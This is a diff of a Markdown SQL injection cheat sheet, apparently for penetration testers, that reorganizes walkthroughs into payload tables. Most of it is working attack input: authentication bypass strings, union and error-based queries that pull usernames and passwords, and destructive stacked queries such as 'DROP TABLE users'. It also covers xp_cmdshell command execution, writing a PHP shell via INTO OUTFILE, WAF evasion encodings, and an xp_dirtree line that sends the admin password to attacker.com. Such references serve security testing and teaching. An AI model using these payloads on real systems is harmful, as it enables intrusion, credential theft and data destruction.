@@ -1,121 +1,163 @@
 # SQL Injection Reference —  [SQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
+### Detection / Breaking Syntax
 
+| Payload | Purpose |
+|---|---|
+| `'` | Single quote — breaks string context, look for SQL error |
+| `"` | Double quote — same idea, for double-quoted contexts |
+| `'-- ` | Quote + comment — closes string then comments out the rest |
+| `' OR '1'='1` | Classic always-true condition |
+| `' OR 1=1-- ` | Always-true condition, comments out trailing query |
+| `'; --` | Tests for stacked query support |
+| `\` | Backslash — tests for escape-character handling bugs |
 
----
+### Boolean-Based Blind
 
-**Payload sent:**
+| Payload | Purpose |
+|---|---|
+| `' AND 1=1-- ` | Should return normal page (true condition) |
+| `' AND 1=2-- ` | Should return different page (false condition) — diff against the above |
+| `' AND 'a'='a` | String-based true condition |
+| `' AND 'a'='b` | String-based false condition |
+| `' AND SUBSTRING(@@version,1,1)='5'-- ` | Tests a specific character of extracted data, one position at a time |
+
+### Time-Based Blind
+
+| Payload | Database | Purpose |
+|---|---|---|
+| `' AND SLEEP(5)-- ` | MySQL | Delay confirms execution with no visible output |
+| `'; SELECT pg_sleep(5)-- ` | PostgreSQL | Same concept |
+| `'; WAITFOR DELAY '0:0:5'-- ` | MSSQL | Same concept |
+| `' AND DBMS_LOCK.SLEEP(5)-- ` | Oracle | Same concept |
+| `' AND IF(1=1,SLEEP(5),0)-- ` | MySQL | Conditional delay — only sleeps if condition is true |
+
+### Union-Based Extraction
+
+| Payload | Purpose |
+|---|---|
+| `' ORDER BY 1-- ` | Increment to find column count (errors when count exceeded) |
+| `' UNION SELECT NULL,NULL,NULL-- ` | Find which columns reflect in the response |
+| `' UNION SELECT username,password,NULL FROM users-- ` | Extract real data once column count/position known |
+| `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- ` | Enumerate table names |
+| `' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- ` | Enumerate columns of a known table |
+
+### Error-Based Extraction
+
+| Payload | Database | Purpose |
+|---|---|---|
+| `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- ` | MySQL | Leaks data via XPATH syntax error message |
+| `' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- ` | MySQL | Same technique, different function |
+| `' AND CAST((SELECT version()) AS int)-- ` | PostgreSQL/MSSQL | Leaks data via type-cast error |
+| `' AND 1=CONVERT(int,(SELECT @@version))-- ` | MSSQL | Leaks data via conversion error |
+
+### Auth Bypass (Login Forms)
+
+| Payload | Purpose |
+|---|---|
+| `admin'-- ` | Comments out password check entirely |
+| `admin'#` | Same, MySQL-style comment |
+| `' OR 1=1-- ` | Always-true WHERE clause |
+| `' OR ''='` | Always-true via empty string comparison |
+| `admin' OR '1'='1'-- ` | Combines known username with always-true condition |
+
+### Stacked Queries
+
+| Payload | Purpose |
+|---|---|
+| `'; DROP TABLE users-- ` | Tests destructive stacked query execution (use only in authorized/lab environments) |
+| `'; INSERT INTO users(username,password) VALUES('hacker','pass')-- ` | Tests write access via stacked query |
+| `'; EXEC xp_cmdshell('whoami')-- ` | MSSQL — tests OS command execution via stacked query |
+
+## Database Function Reference
+
+### Identification
+
+| Function | Database | Purpose |
+|---|---|---|
+| `@@version` | MySQL / MSSQL | Get DB version |
+| `version()` | PostgreSQL | Get DB version |
+| `v$version` | Oracle | Get DB version |
+| `database()` | MySQL | Current database name |
+| `current_database()` | PostgreSQL | Current database name |
+| `DB_NAME()` | MSSQL | Current database name |
+| `user()` / `current_user()` | MySQL / PostgreSQL | Current DB user |
+
+### String / Concatenation
+
+| Function | Database | Purpose |
+|---|---|---|
+| `CONCAT(a,b)` | MySQL | String concatenation |
+| `a \|\| b` | PostgreSQL / Oracle | String concatenation |
+| `a + b` | MSSQL | String concatenation |
+| `SUBSTRING(str,pos,len)` | All | Extract part of a string (used heavily in blind extraction) |
+| `LENGTH(str)` / `LEN(str)` | MySQL/Postgres / MSSQL | Get string length (used to determine extraction loop bounds) |
+
+### File / OS Interaction
+
+| Function | Database | Purpose |
+|---|---|---|
+| `LOAD_FILE('/etc/passwd')` | MySQL | Read local file (requires FILE privilege) |
+| `... INTO OUTFILE '/var/www/shell.php'` | MySQL | Write file — can lead to RCE if web-accessible |
+| `xp_cmdshell('cmd')` | MSSQL | Execute OS command (requires enabled feature + privilege) |
+| `COPY (SELECT ...) TO PROGRAM 'cmd'` | PostgreSQL | Execute OS command (requires superuser) |
+| `UTL_FILE` package | Oracle | Read/write files (requires granted access) |
+
+### Schema Enumeration
+
+| Query target | Purpose |
+|---|---|
+| `information_schema.tables` | List all tables (MySQL/Postgres/MSSQL) |
+| `information_schema.columns` | List all columns for a table |
+| `all_tables` | List tables (Oracle) |
+| `all_tab_columns` | List columns (Oracle) |
+| `sqlite_master` | List tables/schema (SQLite) |
+
+## EXAMPLE PAYLOADS
+
 ```
-'
+' OR '1'='1
 ```
-**Response observed:**
-A single unescaped quote often breaks query syntax outright. Look for a `500` error, a stack trace, or a generic "database error" message — strong signal the input reaches a SQL query unsanitized.
-
----
-
-**Payload sent (boolean-based blind):**
 ```
-' AND 1=1 -- 
-' AND 1=2 -- 
+admin'-- 
 ```
-**Response observed:**
-Send both and diff the responses. `1=1` should return the normal page; `1=2` should return something different (empty result, different length, different status). No visible difference on either = parameter likely not injectable, or filtered.
-
----
-
-**Payload sent (time-based blind, MySQL):**
-```
-' AND SLEEP(5)-- 
-```
-**Response observed:**
-If the response takes ~5 seconds longer than baseline, the payload executed inside a real query — confirms blind injection even with no visible output difference.
-
-## Database-Specific Syntax Cheat Sheet
-
-| Goal | MySQL | PostgreSQL | MSSQL | Oracle |
-|---|---|---|---|---|
-| Comment rest of query | `-- ` or `#` | `-- ` | `-- ` | `-- ` |
-| String concat | `CONCAT(a,b)` | `a \|\| b` | `a + b` | `a \|\| b` |
-| Time delay | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_LOCK.SLEEP(5)` |
-| Version | `@@version` | `version()` | `@@version` | `v$version` |
-| Current DB | `database()` | `current_database()` | `DB_NAME()` | `SELECT name FROM v$database` |
-| List tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
-| Stacked queries | Rare (driver-dependent) | Supported | Supported | Not typical |
-| Subquery in error | `extractvalue()`, `updatexml()` | n/a (use casting errors) | `CONVERT()` cast errors | `CTXSYS.DRITHSX.SN` |
-
-## UNION-Based Extraction Walkthrough
-
-**Step 1 — find column count:**
-```
-' ORDER BY 1-- 
-' ORDER BY 2-- 
-' ORDER BY 3-- 
-```
-Increment until you get an error — that tells you the column count (error = one too many).
-
-**Step 2 — find which columns reflect in output:**
-```
-' UNION SELECT NULL,NULL,NULL-- 
-```
-Replace `NULL`s one at a time with a string (e.g. `'test'`) to identify which positions render in the visible response.
-
-**Step 3 — pull real data:**
 ```
 ' UNION SELECT username, password, NULL FROM users-- 
 ```
-
-## Error-Based Extraction (MySQL example)
-
-**Payload sent:**
 ```
 ' AND extractvalue(1, concat(0x7e, (SELECT version()))) -- 
 ```
-**Response observed:**
-The `extractvalue()` function throws an XPATH syntax error and includes the subquery result (DB version string) directly in the error message — data exfiltrated via the error output itself.
-
-## Out-of-Band Exfiltration (MSSQL example)
-
-**Payload sent:**
+```
+' AND SLEEP(5)-- 
+```
 ```
 '; EXEC master..xp_dirtree '//attacker.com/'+(SELECT password FROM users WHERE username='admin')+'/a'--
 ```
-**Response observed:**
-No visible change in the HTTP response, but the target server makes a DNS/SMB lookup to your listener with the extracted data embedded in the hostname — confirm via your DNS logging server (e.g. Burp Collaborator or a custom listener).
+```
+' UNION SELECT NULL,NULL,NULL-- 
+```
+```
+' AND 1=CONVERT(int,(SELECT @@version))-- 
+```
 
-## WAF / Filter Bypass Techniques
+## Obfuscation / WAF Bypass Techniques
 
 | Technique | Example | Why it works |
 |---|---|---|
-| Case variation | `UnIoN sElEcT` | Bypasses naive case-sensitive keyword filters |
-| Inline comments | `UNION/**/SELECT` | Defeats filters matching on whitespace-separated keywords |
-| Encoding | `%55NION` (URL), or double URL-encoding | Bypasses filters that only decode once |
-| Alternate whitespace | `UNION%0aSELECT` (newline instead of space) | Some parsers accept non-space whitespace that filters don't check |
-| Logical operator swap | `OR` → `\|\|` (MySQL with PIPES_AS_CONCAT off) or `OR 1=1` → `OR true` | Evades keyword-specific blocklists |
-| String concatenation to break keywords | `'UNI' + 'ON SELECT'` (DB-dependent) | Defeats static string matching on full keywords |
-| Second-order injection | Store payload in a profile field, trigger via an unrelated feature that reads it back into a query | Bypasses WAF entirely since the injection point and execution point are different requests |
-
-## Authentication Bypass Payloads (classic, for login forms)
-
-```
-admin' -- 
-admin' #
-' OR 1=1-- 
-' OR ''='
-```
-These aim to either comment out the password check entirely or make the WHERE clause always evaluate true.
-
-## Post-Exploitation Once Injection Is Confirmed
-
-- **Enumerate**: DB version, current user, current DB, privilege level (`SELECT user(), current_user(), @@version`).
-- **Schema mapping**: pull table/column names from `information_schema` (or DB-specific equivalent) before targeting specific data.
-- **Privilege escalation**: check for `FILE` privilege (MySQL `LOAD_FILE()`/`INTO OUTFILE`), `xp_cmdshell` (MSSQL), or `COPY ... TO PROGRAM` (PostgreSQL) for OS command execution.
-- **Read/write files**: `LOAD_FILE('/etc/passwd')`, `SELECT ... INTO OUTFILE '/var/www/shell.php'` — file write can lead to full RCE if the path is web-accessible.
-- **Pivot**: stacked queries or `xp_cmdshell` can be a foothold into the underlying host, not just the DB.
+| Case variation | `UnIoN sElEcT` | Bypasses case-sensitive keyword filters |
+| Inline comments | `UNION/**/SELECT` | Defeats whitespace-based keyword matching |
+| URL encoding | `%55NION%20SELECT` | Bypasses filters that only decode once |
+| Double encoding | `%2553ELECT` | Bypasses filters that decode exactly once before checking |
+| Alternate whitespace | `UNION%0aSELECT` (newline) | Some parsers accept non-space whitespace filters don't check |
+| Logical operator swap | `\|\|` instead of `OR` (DB-dependent) | Evades keyword-specific blocklists |
+| String splitting | `'UNI' + 'ON SELECT'` (DB-dependent concat) | Defeats static full-keyword string matching |
+| Hex/char encoding of strings | `0x61646d696e` instead of `'admin'` | Avoids quote-based filters entirely |
+| Second-order injection | Store payload in a profile field, trigger via unrelated feature reading it back | Bypasses input-point filtering since execution happens elsewhere |
 
 ## Tooling Note
-Manual payloads are good for confirmation and understanding; for full enumeration use `sqlmap` (`--risk`/`--level` tuned to the engagement, `--technique` to target specific injection types) and Burp Suite's scanner/Intruder for parameter fuzzing at scale. Always stay within authorized scope — automated tools can generate significant load and write/delete data if used carelessly.
+Manual payloads are best for confirmation and understanding query structure. For full enumeration, `sqlmap` (tune `--risk`/`--level`, and `--technique` to target specific injection types) and Burp Suite's Scanner/Intruder handle automated, large-scale testing. Stay within authorized scope — stacked queries and file-write payloads can cause real data loss or RCE if run carelessly.
 
 ## Quick Notes
-- Always test with a baseline (clean) request first so you have something to diff against for boolean/time-based detection.
-- Parameterized queries / prepared statements are the actual fix — if you're writing a report, that's the recommendation, not just "sanitize input."
-- ORMs reduce but don't eliminate risk — raw query building or string-concatenated filters inside an ORM are still exploitable.
+- Always grab a clean baseline response first — boolean/time-based detection is entirely about diffing against it.
+- Parameterized queries / prepared statements are the actual fix for a writeup — not "input sanitization" alone.
+- ORMs reduce but don't eliminate risk — raw query building or string-concatenated filters inside an ORM remain exploitable.
